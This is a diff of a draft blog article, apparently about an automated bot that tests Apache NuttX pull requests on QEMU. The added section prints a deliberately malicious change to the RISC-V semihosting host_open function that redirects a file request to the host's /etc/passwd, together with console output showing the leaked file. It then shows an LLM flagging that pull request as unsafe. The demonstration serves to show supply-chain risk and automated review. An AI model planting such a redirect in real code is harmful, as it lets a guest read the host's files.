@@ -67,9 +67,10 @@
     <nav id="rustdoc"><ul>
 <li><a href="#qemu-arm64" title="QEMU Arm64">1 QEMU Arm64</a><ul></ul></li>
 <li><a href="#qemu-arm64-test" title="QEMU Arm64 Test">2 QEMU Arm64 Test</a><ul></ul></li>
-<li><a href="#llm-says-meh" title="LLM Says Meh">3 LLM Says Meh</a><ul></ul></li>
-<li><a href="#todo" title="TODO">4 TODO</a><ul></ul></li>
-<li><a href="#whats-next" title="What’s Next">5 What’s Next</a><ul></ul></li></ul></nav><p>📝 <em>16 Mar 2025</em></p>
+<li><a href="#semihosting-breakout" title="Semihosting Breakout">3 Semihosting Breakout</a><ul></ul></li>
+<li><a href="#llm-says-nope" title="LLM Says Nope!">4 LLM Says Nope!</a><ul></ul></li>
+<li><a href="#todo" title="TODO">5 TODO</a><ul></ul></li>
+<li><a href="#whats-next" title="What’s Next">6 What’s Next</a><ul></ul></li></ul></nav><p>📝 <em>16 Mar 2025</em></p>
 <p><img src="https://lupyuen.org/images/testbot2-title.jpg" alt="TODO" /></p>
 <p>TODO</p>
 <h1 id="qemu-arm64"><a class="doc-anchor" href="#qemu-arm64">§</a>1 QEMU Arm64</h1>
@@ -98,14 +99,92 @@ spawn qemu-system-aarch64 \
 <p>https://github.com/lupyuen2/wip-nuttx/pull/88#issuecomment-2664190707</p>
 <div class="example-wrap"><pre class="language-bash"><code>@nuttxpr test qemu-armv8a:netnsh</code></pre></div>
 <p><a href="https://github.com/lupyuen2/wip-nuttx/pull/88#issuecomment-2664196921">See the Test Log</a></p>
-<h1 id="llm-says-meh"><a class="doc-anchor" href="#llm-says-meh">§</a>3 LLM Says Meh</h1>
-<p>Test with LLM
-Here is a Pull Request for Apache NuttX RTOS that I will check out to my computer and test on QEMU RISC-V 64-bit Kernel Mode. Is it safe to build and test this Pull Request on my computer?</p>
-<h1 id="todo"><a class="doc-anchor" href="#todo">§</a>4 TODO</h1>
+<h1 id="semihosting-breakout"><a class="doc-anchor" href="#semihosting-breakout">§</a>3 Semihosting Breakout</h1>
+<p>https://github.com/lupyuen2/wip-nuttx/blob/sbo/arch/risc-v/src/common/riscv_hostfs.c#L117-L141</p>
+<div class="example-wrap"><pre class="language-c"><code>int host_open(const char *pathname, int flags, int mode)
+{
+  _info(&quot;pathname=%s\n&quot;, pathname);
+  const char *pathname2 =
+    (strcmp(pathname, &quot;../apps/bin/hello&quot;) == 0)
+    ? &quot;/etc/passwd&quot;
+    : pathname;
+  struct
+  {
+    const char *pathname;
+    long mode;
+    size_t len;
+  } open =
+  {
+    .pathname = pathname2,
+    .mode = host_flags_to_mode(flags),
+    .len = strlen(pathname2),
+  };
+
+#ifdef CONFIG_RISCV_SEMIHOSTING_HOSTFS_CACHE_COHERENCE
+  up_clean_dcache(pathname, pathname + open.len + 1);
+#endif
+
+  return host_call(HOST_OPEN, &amp;open, sizeof(open));
+}</code></pre></div>
+<p>https://gist.github.com/lupyuen/a1c06b6cbf08feedee4d711b21561705</p>
+<div class="example-wrap"><pre class="language-bash"><code>NuttShell (NSH) NuttX-12.4.0
+nsh&gt; cat /system/bin/hello
+[    6.841514] host_open: pathname=../apps/bin/cat
+[    6.842859] host_open: pathname=../apps/bin/hello
+nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
+root:*:0:0:System Administrator:/var/root:/bin/sh
+daemon:*:1:1:System Services:/var/root:/usr/bin/false
+nsh&gt; </code></pre></div><h1 id="llm-says-nope"><a class="doc-anchor" href="#llm-says-nope">§</a>4 LLM Says Nope!</h1>
+<p>https://github.com/lupyuen2/wip-nuttx/pull/89</p>
+<p>https://patch-diff.githubusercontent.com/raw/lupyuen2/wip-nuttx/pull/89.diff</p>
+<p>https://gist.github.com/lupyuen/d5a6ac395744c1f33e10690105e20900</p>
+<div class="example-wrap"><pre class="language-text"><code>Here is a Pull Request for Apache NuttX RTOS that I will check out to my computer and test on QEMU RISC-V 64-bit Kernel Mode. Is it safe to build and test this Pull Request on my computer?
+
+diff --git a/arch/risc-v/src/common/riscv_hostfs.c b/arch/risc-v/src/common/riscv_hostfs.c
+index aa1409d6a05b0..db54f11ae7623 100644
+--- a/arch/risc-v/src/common/riscv_hostfs.c
++++ b/arch/risc-v/src/common/riscv_hostfs.c
+@@ -33,6 +33,7 @@
+ #include &lt;string.h&gt;
+ #include &lt;syscall.h&gt;
+ #include &lt;unistd.h&gt;
++#include &lt;debug.h&gt;
+ 
+ /****************************************************************************
+  * Pre-processor Definitions
+@@ -115,6 +116,11 @@ static int host_flags_to_mode(int flags)
+ 
+ int host_open(const char *pathname, int flags, int mode)
+ {
++  _info(&quot;pathname=%s\n&quot;, pathname);
++  const char *pathname2 =
++    (strcmp(pathname, &quot;../apps/bin/hello&quot;) == 0)
++    ? &quot;/etc/passwd&quot;
++    : pathname;
+   struct
+   {
+     const char *pathname;
+@@ -122,9 +128,9 @@ int host_open(const char *pathname, int flags, int mode)
+     size_t len;
+   } open =
+   {
+-    .pathname = pathname,
++    .pathname = pathname2,
+     .mode = host_flags_to_mode(flags),
+-    .len = strlen(pathname),
++    .len = strlen(pathname2),
+   };
+ 
+ #ifdef CONFIG_RISCV_SEMIHOSTING_HOSTFS_CACHE_COHERENCE</code></pre></div>
+<p>https://gist.github.com/lupyuen/d5a6ac395744c1f33e10690105e20900</p>
+<blockquote>
+<p>No, it is not safe to build and test this Pull Request (PR) as it is, because it introduces a significant security vulnerability.</p>
+</blockquote>
+<h1 id="todo"><a class="doc-anchor" href="#todo">§</a>5 TODO</h1>
 <p>What about PinePhone</p>
 <p>What about ESP32</p>
 <p>Kind folks at Espressif could help to modify the scripts to test</p>
-<h1 id="whats-next"><a class="doc-anchor" href="#whats-next">§</a>5 What’s Next</h1>
+<h1 id="whats-next"><a class="doc-anchor" href="#whats-next">§</a>6 What’s Next</h1>
 <p>Special Thanks to <strong>Mr Gregory Nutt</strong> for your guidance and kindness. I’m also grateful to <a href="https://lupyuen.org/articles/sponsor"><strong>My Sponsors</strong></a>, for supporting my writing.</p>
 <ul>
 <li>
